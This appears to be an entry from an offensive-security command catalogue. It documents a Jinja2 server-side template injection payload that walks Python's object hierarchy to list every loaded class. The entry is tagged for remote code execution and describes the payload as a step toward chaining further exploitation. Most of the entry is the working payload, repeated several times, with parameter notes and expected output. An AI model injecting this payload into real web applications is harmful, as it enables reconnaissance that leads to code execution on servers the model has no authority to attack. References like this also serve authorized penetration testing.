---
id: f9856241-9520-44ff-8c09-c1d1ea0d085f
name: jinja2-list-classes
type: command
executor: bash
data: '{{ [].__class__.__bases__[0].__subclasses__() }}'
output: null
created_at: '2025-12-11T03:47:39.253Z'
updated_at: '2025-12-11T03:47:39.253Z'
platforms:
  - Web
tags:
  - ssti
  - jinja2
  - rce
verified: false
validated: true
submitted: true
---

# jinja2-list-classes

## Command

```bash
{{ [].__class__.__bases__[0].__subclasses__() }}
```

## Description

Accesses and lists all subclasses of the object class to explore available classes for further SSTI exploitation and potential RCE chaining.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| __subclasses__() | Method to get subclasses | Yes |
| [].__class__.__bases__[0] | Refers to the base object class | Yes |

## Examples

### Basic Usage

```bash
{{ [].__class__.__bases__[0].__subclasses__() }}
```

## Expected Output

List of all loaded classes/subclasses

## Related

- [[procedures/Explore-Advanced-SSTI-Payloads-for-Exploitation]]
